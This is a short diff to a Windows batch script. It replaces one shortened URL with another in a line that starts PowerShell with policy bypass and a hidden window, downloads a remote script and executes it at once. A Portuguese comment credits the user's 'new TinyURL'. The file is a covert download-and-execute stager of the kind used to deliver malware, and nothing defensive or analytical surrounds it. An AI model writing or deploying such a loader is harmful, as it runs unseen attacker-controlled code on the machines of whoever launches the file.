@@ -1,3 +1,4 @@
 @echo off
-powershell -ep bypass -w hidden -c "iwr -useb https://tinyurl.com/2tabx96w | iex"
+:: Chama a PowerShell de forma indireta usando o teu novo TinyURL
+powershell -ep bypass -w hidden -c "iwr -useb https://tinyurl.com/3y8wnphh | iex"
 exit
